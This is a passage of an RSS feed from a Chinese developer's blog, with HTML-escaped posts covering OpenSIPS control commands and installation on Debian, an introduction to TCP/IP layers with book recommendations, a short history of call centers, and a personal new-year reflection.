&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; alias_db show &amp;lt;alias&amp;gt; .............. show alias details
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; alias_db list &amp;lt;sip-id&amp;gt; ............. list aliases for uri
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; alias_db add &amp;lt;alias&amp;gt; &amp;lt;sip-id&amp;gt; ...... add an alias (*)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; alias_db rm &amp;lt;alias&amp;gt; ................ remove an alias (*)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; alias_db help ...................... help message
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    - &amp;lt;alias&amp;gt; must be an AoR (username@domain)&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    - &amp;lt;sip-id&amp;gt; must be an AoR (username@domain)&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; -- command &amp;#39;&lt;/span&gt;domain&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; - manage local domains
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; domain reload ....................... reload domains from disk
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; domain show ......................... show current domains in memory
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; domain showdb ....................... show domains in the database
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; domain add &amp;lt;domain&amp;gt; ................. add the domain to the database
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; domain rm &amp;lt;domain&amp;gt; .................. delete the domain from the database
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; -- command &amp;#39;&lt;/span&gt;cisco_restart&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; - restart CISCO phone (NOTIFY)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; cisco_restart &amp;lt;uri&amp;gt; ................ restart phone configured for &amp;lt;uri&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; -- command &amp;#39;&lt;/span&gt;online&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; - dump online users from memory
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; online ............................. display online users
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; -- command &amp;#39;&lt;/span&gt;monitor&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; - show internal status
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; monitor ............................ show server&amp;#39;&lt;/span&gt;s internal status
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -- command &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ping&amp;#39;&lt;/span&gt; - ping a SIP URI &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;OPTIONS&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ping &amp;lt;uri&amp;gt; ......................... ping &amp;lt;uri&amp;gt; with SIP OPTIONS
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -- command &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ul&amp;#39;&lt;/span&gt; - manage user location records
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ul show &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&amp;lt;username&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;................ show in-RAM online users
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ul show --brief..................... show in-RAM online users in short format
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ul rm &amp;lt;username&amp;gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&amp;lt;contact URI&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;.... delete user&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s usrloc entries
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; ul add &amp;lt;username&amp;gt; &amp;lt;uri&amp;gt; ............ introduce a permanent usrloc entry
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; ul add &amp;lt;username&amp;gt; &amp;lt;uri&amp;gt; &amp;lt;expires&amp;gt; .. introduce a temporary usrloc entry
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; -- command &amp;#39;&lt;/span&gt;fifo&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; fifo ............................... send raw FIFO command
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;➜  ~ opopensipsctl ul
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ERROR: usrloc - too few parameters
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; -- command &amp;#39;&lt;/span&gt;ul&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; - manage user location records
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; ul show [&amp;lt;username&amp;gt;]................ show in-RAM online users
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; ul show --brief..................... show in-RAM online users in short format
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; ul rm &amp;lt;username&amp;gt; [&amp;lt;contact URI&amp;gt;].... delete user&amp;#39;&lt;/span&gt;s usrloc entries
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ul add &amp;lt;username&amp;gt; &amp;lt;uri&amp;gt; ............ introduce a permanent usrloc entry
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ul add &amp;lt;username&amp;gt; &amp;lt;uri&amp;gt; &amp;lt;expires&amp;gt; .. introduce a temporary usrloc entry
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;opensips命令&#34;&gt;opensips命令&lt;/h1&gt;
&lt;p&gt;opensips -h&lt;/p&gt;</description>
    </item>
    <item>
      <title>debian jessie opensips 2.4.7 安装</title>
      <link>https://wdd.js.org/opensips/ch3/install-opensips/</link>
      <pubDate>Thu, 13 Jun 2019 21:53:16 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch3/install-opensips/</guid>
      <description>&lt;h1 id=&#34;1-安装依赖&#34;&gt;1. 安装依赖&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt-get update -qq &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get install -y build-essential net-tools &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    bison flex m4 pkg-config libncurses5-dev rsyslog libmysqlclient-dev &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    libssl-dev mysql-client libmicrohttpd-dev libcurl4-openssl-dev uuid-dev &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    libpcre3-dev libconfuse-dev libxml2-dev libhiredis-dev wget lsof
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;2-编译&#34;&gt;2. 编译&lt;/h1&gt;
&lt;p&gt;下载opensips-2.4.7的源码，然后解压。&lt;/p&gt;
&lt;p&gt;include_moduls可以按需指定，你可以只写你需要的模块。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd /usr/local/src/opensips-2.4.7
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;make all -j4 include_modules&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mysql httpd db_http siprec regex rest_client carrierroute dialplan b2b_logic cachedb_redis proto_tls proto_wss tls_mgm&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;make install include_modules&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mysql httpd db_http siprec regex rest_client carrierroute dialplan b2b_logic cachedb_redis proto_tls proto_wss tls_mgm&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>如何学习网络协议？</title>
      <link>https://wdd.js.org/posts/2019/01/books-about-network-protocol/</link>
      <pubDate>Fri, 18 Jan 2019 21:32:08 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/01/books-about-network-protocol/</guid>
      <description>&lt;h1 id=&#34;如何学习网络协议&#34;&gt;如何学习网络协议？&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;大学时，学到网络协议的7层模型时，老师教了大家一个顺口溜：物数网传会表应。并说这是重点，年年必考，5分的题目摆在这里，你们爱背不背。
考试的时候，果然遇到这个问题，搜索枯肠，只能想到这7个字的第一个字，因为这5分，差点挂科。
后来工作面试，面试官也是很喜欢七层模型，三次握手之类的问题，但是遇到这些问题时，总是觉得很心虚。&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;1-协议分层&#34;&gt;1. 协议分层&lt;/h1&gt;
&lt;p&gt;四层网络协议模型中，应用层以下一般都是交给操作系统来处理。应用层对于四层模型来说，仅仅是冰山一角。海面下巨复杂的三层协议，都被操作系统给隐藏起来了，一般我们在页面上发起一个ajax请求，看见了network面板多了一个http请求，至于底层是如何实现的，我们并不关心。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://assets.processon.com/chart_image/5c41d889e4b0641c83e1f059.png&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;应⽤层&lt;/code&gt;负责处理特定的应⽤程序细节。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;运输层&lt;/code&gt;运输层主要为两台主机上的应⽤程序提供端到端的通信。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;网络层&lt;/code&gt;处理理分组在⽹网络中的活动，例例如分组的选路&lt;/li&gt;
&lt;li&gt;&lt;code&gt;链路层&lt;/code&gt;处理理与电缆(或其他任何传输媒介)的物理理接⼝口细节&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下面重点讲一下运输层和网络层&lt;/p&gt;
&lt;h2 id=&#34;11-运输层的两兄弟&#34;&gt;1.1. 运输层的两兄弟&lt;/h2&gt;
&lt;p&gt;运输层有两个比较重要的协议。tcp和udp。&lt;/p&gt;
&lt;p&gt;大哥tcp是比较&lt;code&gt;严谨认真、温柔体贴、慢热内向&lt;/code&gt;的协议，发出去的消息，总是一个一个认真检查，等待对方回复和确认，如果一段时间内，对方没有回复确认消息，还会再次发送消息，如果对方回复说你发的太快了，tcp还会体贴的把发送消息的速度降低。&lt;/p&gt;
&lt;p&gt;弟弟udp则比较可爱呆萌、调皮好动、不负责任的协议。哥哥tcp所具有的特点，弟弟udp一个也没有。但是&lt;code&gt;有的人说不清哪里好 但就是谁都替代不了&lt;/code&gt;，udp没有tcp那些复杂的校验和重传等复杂的步骤，所以它发送消息非常快，而且并不保证对方一定收到。如果对方收不到消息，那么udp就会呆萌的看着你，笑着对你说：&lt;code&gt;我已经尽力了&lt;/code&gt;。一般语音而视频数据都是用udp协议传输的，因为音频或者视频卡了一下并不影响整体的质量，而对实时性的要求会更高。&lt;/p&gt;
&lt;h2 id=&#34;12-运输层和网络层的区别&#34;&gt;1.2. 运输层和网络层的区别&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;运输层关注的是端到端层面&lt;/code&gt;，及End1到End2，忽略中间的任何点。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;网络层关注两点之间的层面&lt;/code&gt;，即hop1如何到hop2，hop2如何到hop3&lt;/li&gt;
&lt;li&gt;&lt;code&gt;网络层并不保证消息可靠性&lt;/code&gt;，可靠性上层的传输层负责。TCP采用超时重传，分组确认的机制，保证消息不会丢失。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://assets.processon.com/chart_image/5c41e125e4b056ae29f55886.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;从下图tcp, udp, ip协议中，可以发现&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;传输层的tcp和udp都是有源端口和目的端口，但是没有ip字段&lt;/li&gt;
&lt;li&gt;源ip和目的ip只在ip数据报中&lt;/li&gt;
&lt;li&gt;理解各个协议，关键在于理解报文的各个字段的含义&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://assets.processon.com/chart_image/5c41e22fe4b056ae29f55947.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;13-ip和端口号的真正含义&#34;&gt;1.3. ip和端口号的真正含义&lt;/h2&gt;
&lt;p&gt;上个章节讲到运输层和网络层的区别，其中端口号被封装在运输层，ip被封装到网络成，&lt;/p&gt;
&lt;p&gt;那么端口号和ip地址到底有什么区别呢？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ip用来用来标记主机的位置&lt;/li&gt;
&lt;li&gt;端口号用来标记该数据应该被目标主机上的哪个应用程序去处理&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://assets.processon.com/chart_image/5c41e3a1e4b0fa03ce9f52c9.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;14-数据在协议栈的流动-封装与分用&#34;&gt;1.4. 数据在协议栈的流动 封装与分用&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;当发送消息时，数据在向下传递时，经过不同层次的协议处理，打上各种头部信息&lt;/li&gt;
&lt;li&gt;当接受消息时，数据在向上传递，通过不同的头部信息字段，才知道要交给上层的那个模块来处理。比如一个ip包，如果没有头部信息，那么这个消息究竟是交给tcp协议来处理，还是udp来处理，就不得而知了&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://assets.processon.com/chart_image/5c41e531e4b056ae29f55ab3.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-深入阅读好书推荐&#34;&gt;2. 深入阅读，好书推荐&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;《http权威指南》 &lt;code&gt;有人说这本书太厚，偷偷告诉你，其实这本书并厚，因为这本书的后面的30%部分都是附录，这本书的精华是前50%的部分&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;《图解http》、《图解tcp/ip》&lt;code&gt;这两本图解的书，知识点讲的都是比较通俗易懂的，适合入门&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;《tcp/ip 详解 卷1》&lt;code&gt;这本书，让你知其然，更知其所以然&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;《tcp/ip 基础》、《tcp/ip 路由技术》&lt;code&gt;这两本书，会让你从不同角度思考协议&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;《精通wireshark》、《wireshark网络分析实战》&lt;code&gt;如果你看了很多书，却从来没有试过网络抓包，那你只是懂纸上谈兵罢了。你永远无法理解tcp三次握手的怦然心动，与四次分手的刻骨铭心。&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>呼叫中心简史</title>
      <link>https://wdd.js.org/posts/2019/01/call-center-brief-history/</link>
      <pubDate>Tue, 15 Jan 2019 21:04:11 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/01/call-center-brief-history/</guid>
      <description>&lt;h1 id=&#34;什么是呼叫中心&#34;&gt;什么是呼叫中心？&lt;/h1&gt;
&lt;p&gt;呼叫中心又称为客户服务中心。有以下关键词&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CTI&lt;/li&gt;
&lt;li&gt;通信网络&lt;/li&gt;
&lt;li&gt;计算机&lt;/li&gt;
&lt;li&gt;企业级&lt;/li&gt;
&lt;li&gt;高质量、高效率、全方位、综合信息服务&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;呼叫中心历史&#34;&gt;呼叫中心历史&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;1956年美国泛美航空公司建成世界第一家呼叫中心。&lt;/p&gt;&lt;/blockquote&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;阶段&lt;/th&gt;
          &lt;th&gt;行业范围&lt;/th&gt;
          &lt;th&gt;技术&lt;/th&gt;
          &lt;th&gt;功能与意义&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;第一代呼叫中心&lt;/td&gt;
          &lt;td&gt;民航&lt;/td&gt;
          &lt;td&gt;PBX、电话排队&lt;/td&gt;
          &lt;td&gt;主要服务由人工完成&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;第二代呼叫中心&lt;/td&gt;
          &lt;td&gt;银行、生活&lt;/td&gt;
          &lt;td&gt;IVR(交互式语音应答)、DTMF&lt;/td&gt;
          &lt;td&gt;显著提高工作效率，提供全天候服务&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;第三代呼叫中心&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;CTI(电脑计算机集成)&lt;/td&gt;
          &lt;td&gt;语音数据同步，客户信息存储与查阅，个性化服务，自动化&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;第四代呼叫中心&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;接入电子邮件、互联网、手机短信等&lt;/td&gt;
          &lt;td&gt;多渠道接入、多渠道统一排队&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;第五代呼叫中心&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;接入社交网络、社交媒体(微博、微信等)&lt;/td&gt;
          &lt;td&gt;文本交谈，音频视频沟通&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;呼叫中心分类&#34;&gt;呼叫中心分类&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;按呼叫方式分类
&lt;ul&gt;
&lt;li&gt;外呼型呼叫中心（如电话营销）&lt;/li&gt;
&lt;li&gt;客服型呼叫中心（如客户服务）&lt;/li&gt;
&lt;li&gt;混合型呼叫中心 （如营销和客服）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;按技术架构分类
&lt;ul&gt;
&lt;li&gt;交换机&lt;/li&gt;
&lt;li&gt;板卡&lt;/li&gt;
&lt;li&gt;软交换（IPCC）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://assets.processon.com/chart_image/5c3de07ee4b0641c83dd3eff.png&#34;&gt;
【交换机类型呼叫中心】&lt;/p&gt;</description>
    </item>
    <item>
      <title>时间花在哪里，你就会成为什么样的人</title>
      <link>https://wdd.js.org/posts/2018/01/where-time-you-spend-what-you-will-be/</link>
      <pubDate>Tue, 01 Jan 2019 21:02:08 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/01/where-time-you-spend-what-you-will-be/</guid>
      <description>&lt;h1 id=&#34;2008-2018-十年往事如昨&#34;&gt;2008-2018 十年，往事如昨&lt;/h1&gt;
&lt;p&gt;2018年已经是昨天，今天是2019的第一天。&lt;/p&gt;
&lt;p&gt;2008年已经是10年前，10年前的傍晚，我走在南京仙林的一个大街上，提着一瓶矿泉水，擦着额头的汗水，仰头看着大屏幕上播放着北京奥运会的开幕式。&lt;/p&gt;
&lt;p&gt;10年前的夏天，我带着一步诺基亚手机功能机，独自一人去了南京。&lt;/p&gt;
&lt;p&gt;坐过绣球公园的石凳，穿过天妃宫的回廊，吹过阅江楼的凉爽的江风，踏着古老斑驳的城墙，在林荫小路的长椅上，我想着10年后我会在哪里？做着什么事情？&lt;/p&gt;
&lt;p&gt;往事如昨，而今将近而立，但是依然觉得自己还是10年的那个独自出去玩的小男孩。&lt;/p&gt;
&lt;h1 id=&#34;2018-读了10年都没有读完的书五味杂陈&#34;&gt;2018 读了10年都没有读完的书，五味杂陈&lt;/h1&gt;
&lt;p&gt;2018年，在我做手术前，我觉得自己出了工作的时间外，大多数时间都在看书。2018年这一年看的书，要比2008到2018年这十年间的看的书都要多。这都归功于我对每天的看书都有定量的计划，一旦按照这个计划实行几个月，积累的效果还是非常明显的。&lt;/p&gt;
&lt;p&gt;2018年，手机几乎成为人的四肢之外的第五肢。对大多人来说，上厕所可以不带纸，但是不能不带手机。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;各种APP, 都在极力的吸引用户多花点时间在自己身上&lt;/li&gt;
&lt;li&gt;信息流充斥着各种毫无营养，专门吸人眼球的垃圾新闻，但是这种新闻的阅读量还是蛮大的&lt;/li&gt;
&lt;li&gt;各种借钱，信用卡，花呗等都像青楼的小姐，妩媚的笑容，说道：官人，进来做一做&lt;/li&gt;
&lt;li&gt;共享单车，在今年退潮之后，才发现自己都在裸泳&lt;/li&gt;
&lt;li&gt;比特币，挖矿机。不知道谁割了谁的韭菜，总希望有下一个傻子来接盘，最后发现自己可能就是最后一个傻子&lt;/li&gt;
&lt;li&gt;AI，人工智能很火，放佛就快要进入终结者那样的世界&lt;/li&gt;
&lt;li&gt;锤子垮了，曾经吹过的牛逼，曾经理想主义终于脱去那又黑又亮的面具&lt;/li&gt;
